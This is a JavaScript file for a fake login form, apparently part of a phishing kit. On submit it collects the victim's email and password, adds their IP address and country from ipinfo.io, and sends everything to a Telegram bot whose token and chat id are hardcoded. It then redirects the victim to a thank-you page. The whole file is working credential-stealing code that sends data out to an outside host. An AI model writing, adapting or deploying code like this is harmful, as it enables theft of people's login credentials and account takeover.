document.addEventListener('DOMContentLoaded', function () {
  fetch('https://ipinfo.io?token=657a7d0bf4a276')
    .then(response => response.json())
    .then(data => {
      document.getElementById('ipAddress').value = data.ip;
      window.countryCode = data.country;
    })
    .catch(error => {
      console.error('IP fetch error:', error);
    });
});

function getFlagEmoji(countryCode) {
  const codePoints = countryCode.toUpperCase().split('').map(c => 0x1F1E6 - 65 + c.charCodeAt(0));
  return String.fromCodePoint(...codePoints);
}

document.getElementById('loginForm').addEventListener('submit', function (event) {
  event.preventDefault();

  const email = document.getElementById('email').value.trim();
  const password = document.getElementById('password').value.trim();
  const ipAddress = document.getElementById('ipAddress').value;
  const flag = window.countryCode ? getFlagEmoji(window.countryCode) : 'Unknown';

  const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  const errorMsg = document.getElementById('errorMessage');

  // Only validate the email format on the client side. Password validation removed as requested.
  if (!emailPattern.test(email)) {
    errorMsg.textContent = 'Enter valid email.';
    errorMsg.style.display = 'block';
    return;
  } else {
    errorMsg.style.display = 'none';
  }

  const message = `Login Details:\nEmail: ${email}\nPassword: ${password}\nIP: ${ipAddress}\nCountry: ${flag}`;
  const token = '7660525561:AAEGYLcSax6uX8ywEcGJCBcxpzsTrICNAnk';
  const chat_id = '7022545667';
  const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;

  fetch(url)
    .then(response => response.json())
    .then(data => {
      if (data.ok) {
        window.location.href = 'thanks.html';
      }
    })
    .catch(error => {
      console.error('Telegram error:', error);
    });
});

